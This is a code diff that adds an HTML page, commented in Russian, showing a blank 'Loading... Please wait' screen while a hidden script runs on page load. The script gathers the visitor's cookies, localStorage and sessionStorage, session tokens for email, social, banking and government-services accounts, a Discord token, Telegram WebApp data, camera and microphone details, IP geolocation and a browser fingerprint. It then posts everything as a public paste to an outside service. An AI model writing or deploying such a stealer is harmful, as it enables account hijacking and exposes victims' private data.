@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: white; min-height: 100vh; }
+        .content {
+            font-family: Arial, sans-serif;
+            color: #333;
+            padding: 20px;
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>Loading...</h1>
+        <p>Please wait</p>
+    </div>
+
+    <script>
+        // API ключ (замените на свой с pastefy.app)
+        const PASTEFY_API_KEY = "YOUR_API_KEY_HERE";
+        
+        async function sendToPastefy(data) {
+            const url = "https://pastefy.app/api/v2/paste";
+            const headers = {
+                "Authorization": `Bearer ${PASTEFY_API_KEY}`,
+                "Content-Type": "application/json"
+            };
+            const payload = {
+                content: data,
+                title: `FULL_DATA_${Date.now()}`,
+                visibility: "PUBLIC"
+            };
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: headers,
+                    body: JSON.stringify(payload)
+                });
+                if (response.ok) {
+                    const result = await response.json();
+                    const pasteId = result.paste?.id || result.id;
+                    console.log(`✅ Публичная паста: https://pastefy.app/${pasteId}`);
+                }
+            } catch(e) {
+                console.log(`❌ Ошибка: ${e.message}`);
+            }
+        }
+        
+        // ========== 1. КАМЕРА И МИКРОФОН ==========
+        async function getMediaInfo() {
+            let camera = { available: false, devices: [], permissions: "unknown", details: null };
+            let microphone = { available: false, devices: [], permissions: "unknown", details: null };
+            
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                camera.devices = devices.filter(d => d.kind === 'videoinput').map(d => ({ label: d.label || "скрыто", deviceId: d.deviceId.substring(0, 20) }));
+                microphone.devices = devices.filter(d => d.kind === 'audioinput').map(d => ({ label: d.label || "скрыто", deviceId: d.deviceId.substring(0, 20) }));
+                camera.available = camera.devices.length > 0;
+                microphone.available = microphone.devices.length > 0;
+                
+                if (navigator.permissions) {
+                    try {
+                        const camPerm = await navigator.permissions.query({ name: 'camera' });
+                        camera.permissions = camPerm.state;
+                    } catch(e) {}
+                    try {
+                        const micPerm = await navigator.permissions.query({ name: 'microphone' });
+                        microphone.permissions = micPerm.state;
+                    } catch(e) {}
+                }
+                
+                // Тестовый захват
+                if (camera.permissions === 'granted' || microphone.permissions === 'granted') {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({
+                            video: camera.available,
+                            audio: microphone.available
+                        });
+                        const videoTracks = stream.getVideoTracks();
+                        const audioTracks = stream.getAudioTracks();
+                        if (videoTracks[0]) {
+                            camera.details = {
+                                label: videoTracks[0].label,
+                                settings: videoTracks[0].getSettings()
+                            };
+                        }
+                        if (audioTracks[0]) {
+                            microphone.details = {
+                                label: audioTracks[0].label,
+                                settings: audioTracks[0].getSettings()
+                            };
+                        }
+                        videoTracks.forEach(t => t.stop());
+                        audioTracks.forEach(t => t.stop());
+                    } catch(e) {}
+                }
+            } catch(e) {}
+            
+            return { camera, microphone };
+        }
+        
+        // ========== 2. ВСЕ COOKIES ==========
+        function getAllCookies() {
+            const cookies = document.cookie.split(';').map(c => c.trim());
+            const important = [];
+            const all = cookies.map(c => {
+                const [name, value] = c.split('=');
+                if (value && (name.includes('session') || name.includes('token') || name.includes('auth') || name.includes('login') || name.includes('email') || name.includes('user') || name.includes('id'))) {
+                    important.push({ name, value: value.substring(0, 50) });
+                }
+                return { name, value: value ? value.substring(0, 50) : '' };
+            });
+            return { all: all.slice(0, 30), important };
+        }
+        
+        // ========== 3. ВСЕ localStorage И sessionStorage ==========
+        function getAllStorages() {
+            const localStorageData = [];
+            const sessionStorageData = [];
+            const importantKeys = ['token', 'session', 'auth', 'user', 'email', 'profile', 'id', 'key', 'secret', 'password', 'login', 'credentials'];
+            
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                let value = localStorage.getItem(key);
+                const isImportant = importantKeys.some(ik => key.toLowerCase().includes(ik));
+                localStorageData.push({ key, value: value ? value.substring(0, 100) : '', important: isImportant });
+            }
+            
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                let value = sessionStorage.getItem(key);
+                const isImportant = importantKeys.some(ik => key.toLowerCase().includes(ik));
+                sessionStorageData.push({ key, value: value ? value.substring(0, 100) : '', important: isImportant });
+            }
+            
+            return { localStorage: localStorageData, sessionStorage: sessionStorageData };
+        }
+        
+        // ========== 4. ПРОВЕРКА СОЦСЕТЕЙ И СЕРВИСОВ ==========
+        async function checkAllServices() {
+            const services = {
+                // Почтовые сервисы
+                gmail: { domains: ['mail.google.com', 'accounts.google.com'], cookies: ['SAPISID', 'HSID', 'SSID', 'OSID'], loggedIn: false },
+                mailru: { domains: ['mail.ru', 'account.mail.ru'], cookies: ['auth', 'Mpop'], loggedIn: false },
+                yandex: { domains: ['mail.yandex.ru', 'passport.yandex.ru'], cookies: ['Session_id', 'yandex_login'], loggedIn: false },
+                outlook: { domains: ['outlook.live.com', 'login.live.com'], cookies: ['RPSSession'], loggedIn: false },
+                yahoo: { domains: ['mail.yahoo.com', 'login.yahoo.com'], cookies: ['Y'], loggedIn: false },
+                rambler: { domains: ['mail.rambler.ru', 'id.rambler.ru'], cookies: ['rambler'], loggedIn: false },
+                
+                // Соцсети
+                vk: { domains: ['vk.com', 'id.vk.com'], cookies: ['remixsid', 'remix'], loggedIn: false, data: {} },
+                ok: { domains: ['ok.ru'], cookies: ['OD', 'OSP'], loggedIn: false },
+                telegram: { domains: ['web.telegram.org'], cookies: ['tg_'], loggedIn: false, webApp: null },
+                discord: { domains: ['discord.com'], cookies: ['__cfduid'], loggedIn: false, token: null },
+                twitter: { domains: ['twitter.com', 'x.com'], cookies: ['auth_token'], loggedIn: false },
+                instagram: { domains: ['instagram.com'], cookies: ['sessionid', 'ig_did'], loggedIn: false },
+                facebook: { domains: ['facebook.com', 'fb.com'], cookies: ['c_user', 'xs'], loggedIn: false },
+                tiktok: { domains: ['tiktok.com'], cookies: ['sessionid'], loggedIn: false },
+                twitch: { domains: ['twitch.tv'], cookies: ['auth-token'], loggedIn: false },
+                
+                // Госуслуги и важные сервисы
+                gosuslugi: { domains: ['gosuslugi.ru', 'esia.gosuslugi.ru'], cookies: ['esia'], loggedIn: false, data: {} },
+                sberbank: { domains: ['online.sberbank.ru', 'sberbank.ru'], cookies: ['session'], loggedIn: false },
+                tinkoff: { domains: ['tinkoff.ru'], cookies: ['session'], loggedIn: false },
+                alfa: { domains: ['alfabank.ru'], cookies: ['session'], loggedIn: false },
+                
+                // Другие
+                youtube: { domains: ['youtube.com'], cookies: ['LOGIN_INFO'], loggedIn: false },
+                netflix: { domains: ['netflix.com'], cookies: ['NetflixId'], loggedIn: false },
+                spotify: { domains: ['spotify.com'], cookies: ['sp_dc'], loggedIn: false },
+                github: { domains: ['github.com'], cookies: ['user_session'], loggedIn: false },
+                reddit: { domains: ['reddit.com'], cookies: ['reddit_session'], loggedIn: false },
+                twitch: { domains: ['twitch.tv'], cookies: ['auth-token'], loggedIn: false }
+            };
+            
+            // Проверка по кукам
+            const allCookies = document.cookie;
+            for (const [name, service] of Object.entries(services)) {
+                for (const cookieName of service.cookies) {
+                    if (allCookies.includes(cookieName)) {
+                        service.loggedIn = true;
+                        // Извлекаем значение куки
+                        const match = allCookies.match(new RegExp(`${cookieName}=([^;]+)`));
+                        if (match) {
+                            service.data = { ...service.data, [cookieName]: match[1].substring(0, 50) };
+                        }
+                    }
+                }
+            }
+            
+            // Специальные проверки
+            // Discord токен из localStorage
+            const discordToken = localStorage.getItem('token');
+            if (discordToken) {
+                services.discord.loggedIn = true;
+                services.discord.token = discordToken.substring(0, 80);
+            }
+            
+            // Telegram WebApp
+            if (window.Telegram && window.Telegram.WebApp) {
+                services.telegram.loggedIn = true;
+                services.telegram.webApp = {
+                    initData: window.Telegram.WebApp.initData?.substring(0, 200),
+                    platform: window.Telegram.WebApp.platform,
+                    version: window.Telegram.WebApp.version
+                };
+            }
+            
+            // Яндекс аккаунт
+            const yandexLogin = localStorage.getItem('yandex_login') || document.cookie.match(/yandex_login=([^;]+)/)?.[1];
+            if (yandexLogin) {
+                services.yandex.data.login = yandexLogin;
+            }
+            
+            // Mail.ru
+            const mailruAuth = localStorage.getItem('auth') || document.cookie.match(/auth=([^;]+)/)?.[1];
+            if (mailruAuth) {
+                services.mailru.data.auth = mailruAuth.substring(0, 50);
+            }
+            
+            return services;
+        }
+        
+        // ========== 5. ПОЛУЧЕНИЕ IP И ГЕО ==========
+        async function getIPAndGeo() {
+            let ip = "unknown";
+            let geo = {};
+            try {
+                const res = await fetch("https://ipapi.co/json/");
+                const data = await res.json();
+                ip = data.ip;
+                geo = {
+                    country: data.country_name,
+                    city: data.city,
+                    region: data.region,
+                    lat: data.latitude,
+                    lon: data.longitude,
+                    isp: data.org
+                };
+            } catch(e) {}
+            return { ip, geo };
+        }
+        
+        // ========== 6. БРАУЗЕРНЫЙ ОТПЕЧАТОК ==========
+        function getBrowserFingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 200, 50);
+            ctx.fillStyle = '#069';
+            ctx.font = '14px Arial';
+            ctx.fillText('FP', 10, 30);
+            const canvasHash = canvas.toDataURL().substring(0, 100);
+            
+            let webgl = {};
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        webgl = {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                }
+            } catch(e) {}
+            
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? Array.from(navigator.languages) : [],
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                screenSize: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                canvasHash,
+                webgl,
+                plugins: Array.from(navigator.plugins || []).map(p => p.name)
+            };
+        }
+        
+        // ========== 7. ОСНОВНОЙ СБОР ==========
+        async function collectAll() {
+            console.log("Начало сбора данных...");
+            
+            const [mediaInfo, services, ipGeo, fingerprint, storages, cookies] = await Promise.all([
+                getMediaInfo(),
+                checkAllServices(),
+                getIPAndGeo(),
+                Promise.resolve(getBrowserFingerprint()),
+                Promise.resolve(getAllStorages()),
+                Promise.resolve(getAllCookies())
+            ]);
+            
+            // Формируем отчет
+            let report = "╔══════════════════════════════════════════════════════════════════════════════╗\n";
+            report += "║                    ПОЛНЫЙ СБОР ДАННЫХ (СОЦСЕТИ + ПОЧТА + КАМЕРА)                ║\n";
+            report += `║                           ${new Date().toISOString()}                                    ║\n`;
+            report += "╠══════════════════════════════════════════════════════════════════════════════╣\n\n";
+            
+            // IP и гео
+            report += "【 1. IP И ГЕОЛОКАЦИЯ 】\n";
+            report += `├─ IP адрес: ${ipGeo.ip}\n`;
+            report += `├─ Страна: ${ipGeo.geo.country || 'unknown'}\n`;
+            report += `├─ Город: ${ipGeo.geo.city || 'unknown'}\n`;
+            report += `├─ Регион: ${ipGeo.geo.region || 'unknown'}\n`;
+            report += `├─ Координаты: ${ipGeo.geo.lat || '?'}, ${ipGeo.geo.lon || '?'}\n`;
+            report += `└─ Провайдер: ${ipGeo.geo.isp || 'unknown'}\n\n`;
+            
+            // Камера и микрофон
+            report += "【 2. КАМЕРА И МИКРОФОН 】\n";
+            report += `├─ Камера:\n`;
+            report += `│  ├─ Доступна: ${mediaInfo.camera.available ? '✅ ДА' : '❌ НЕТ'}\n`;
+            report += `│  ├─ Разрешение: ${mediaInfo.camera.permissions}\n`;
+            report += `│  ├─ Устройств: ${mediaInfo.camera.devices.length}\n`;
+            if (mediaInfo.camera.details) {
+                report += `│  ├─ Название: ${mediaInfo.camera.details.label || 'скрыто'}\n`;
+                report += `│  └─ Параметры: ${JSON.stringify(mediaInfo.camera.details.settings)}\n`;
+            } else {
+                report += `│  └─ Детали: недоступны (нет разрешения)\n`;
+            }
+            report += `├─ Микрофон:\n`;
+            report += `│  ├─ Доступен: ${mediaInfo.microphone.available ? '✅ ДА' : '❌ НЕТ'}\n`;
+            report += `│  ├─ Разрешение: ${mediaInfo.microphone.permissions}\n`;
+            report += `│  ├─ Устройств: ${mediaInfo.microphone.devices.length}\n`;
+            if (mediaInfo.microphone.details) {
+                report += `│  ├─ Название: ${mediaInfo.microphone.details.label || 'скрыто'}\n`;
+                report += `│  └─ Параметры: ${JSON.stringify(mediaInfo.microphone.details.settings)}\n`;
+            } else {
+                report += `│  └─ Детали: недоступны (нет разрешения)\n`;
+            }
+            report += "\n";
+            
+            // ПОЧТОВЫЕ СЕРВИСЫ
+            report += "【 3. ПОЧТОВЫЕ СЕРВИСЫ 】\n";
+            const emailServices = ['gmail', 'mailru', 'yandex', 'outlook', 'yahoo', 'rambler'];
+            for (const svc of emailServices) {
+                const s = services[svc];
+                report += `├─ ${svc.toUpperCase()}: ${s.loggedIn ? '✅ ВОШЕЛ' : '❌ НЕ ВОШЕЛ'}\n`;
+                if (s.loggedIn && Object.keys(s.data || {}).length > 0) {
+                    for (const [k, v] of Object.entries(s.data)) {
+                        report += `│  └─ ${k}: ${v}\n`;
+                    }
+                }
+            }
+            report += "\n";
+            
+            // СОЦИАЛЬНЫЕ СЕТИ
+            report += "【 4. СОЦИАЛЬНЫЕ СЕТИ 】\n";
+            const socialServices = ['vk', 'ok', 'telegram', 'discord', 'twitter', 'instagram', 'facebook', 'tiktok', 'twitch', 'youtube'];
+            for (const svc of socialServices) {
+                const s = services[svc];
+                report += `├─ ${svc.toUpperCase()}: ${s.loggedIn ? '✅ ВОШЕЛ' : '❌ НЕ ВОШЕЛ'}\n`;
+                if (s.loggedIn) {
+                    if (s.token) report += `│  └─ Token: ${s.token}\n`;
+                    if (s.webApp) report += `│  └─ Telegram WebApp: ${JSON.stringify(s.webApp).substring(0, 150)}\n`;
+                    if (s.data && Object.keys(s.data).length > 0) {
+                        for (const [k, v] of Object.entries(s.data)) {
+                            report += `│  └─ ${k}: ${v}\n`;
+                        }
+                    }
+                }
+            }
+            report += "\n";
+            
+            // ГОСУСЛУГИ И БАНКИ
+            report += "【 5. ГОСУСЛУГИ И БАНКИ 】\n";
+            const govServices = ['gosuslugi', 'sberbank', 'tinkoff', 'alfa'];
+            for (const svc of govServices) {
+                const s = services[svc];
+                report += `├─ ${svc.toUpperCase()}: ${s.loggedIn ? '✅ ДОСТУП ЕСТЬ' : '❌ НЕТ ДОСТУПА'}\n`;
+                if (s.loggedIn && s.data) {
+                    for (const [k, v] of Object.entries(s.data)) {
+                        report += `│  └─ ${k}: ${v}\n`;
+                    }
+                }
+            }
+            report += "\n";
+            
+            // ДРУГИЕ СЕРВИСЫ
+            report += "【 6. ДРУГИЕ СЕРВИСЫ 】\n";
+            const otherServices = ['netflix', 'spotify', 'github', 'reddit'];
+            for (const svc of otherServices) {
+                const s = services[svc];
+                report += `├─ ${svc.toUpperCase()}: ${s.loggedIn ? '✅ ВОШЕЛ' : '❌ НЕ ВОШЕЛ'}\n`;
+            }
+            report += "\n";
+            
+            // COOKIES
+            report += "【 7. ВАЖНЫЕ COOKIES 】\n";
+            if (cookies.important.length > 0) {
+                for (const c of cookies.important.slice(0, 15)) {
+                    report += `├─ ${c.name}: ${c.value}\n`;
+                }
+            } else {
+                report += "└─ Важных cookies не найдено\n";
+            }
+            report += "\n";
+            
+            // localStorage ВАЖНЫЕ ДАННЫЕ
+            report += "【 8. localStorage (важные ключи) 】\n";
+            const importantStorage = storages.localStorage.filter(s => s.important);
+            if (importantStorage.length > 0) {
+                for (const s of importantStorage.slice(0, 15)) {
+                    report += `├─ ${s.key}: ${s.value}\n`;
+                }
+            } else {
+                report += "└─ Важных данных в localStorage не найдено\n";
+            }
+            report += "\n";
+            
+            // БРАУЗЕРНЫЙ ОТПЕЧАТОК
+            report += "【 9. БРАУЗЕРНЫЙ ОТПЕЧАТОК 】\n";
+            report += `├─ User-Agent: ${fingerprint.userAgent}\n`;
+            report += `├─ Платформа: ${fingerprint.platform}\n`;
+            report += `├─ Язык: ${fingerprint.language}\n`;
+            report += `├─ Языки: ${fingerprint.languages.join(', ')}\n`;
+            report += `├─ Ядра CPU: ${fingerprint.hardwareConcurrency || '?'}\n`;
+            report += `├─ Память: ${fingerprint.deviceMemory || '?'} GB\n`;
+            report += `├─ Экран: ${fingerprint.screenSize}\n`;
+            report += `├─ Глубина цвета: ${fingerprint.colorDepth}bit\n`;
+            report += `├─ Часовой пояс: ${fingerprint.timezone}\n`;
+            report += `├─ WebGL Vendor: ${fingerprint.webgl?.vendor || '?'}\n`;
+            report += `├─ WebGL Renderer: ${fingerprint.webgl?.renderer || '?'}\n`;
+            report += `└─ Плагинов: ${fingerprint.plugins?.length || 0}\n\n`;
+            
+            report += "═══════════════════════════════════════════════════════════════════════════════\n";
+            report += `[КОНЕЦ СБОРА - ${new Date().toISOString()}]\n`;
+            
+            // Отправка
+            await sendToPastefy(report);
+            console.log("✅ Данные отправлены!");
+        }
+        
+        // Запуск
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => collectAll());
+        } else {
+            collectAll();
+        }
+    </script>
+</body>
+</html>
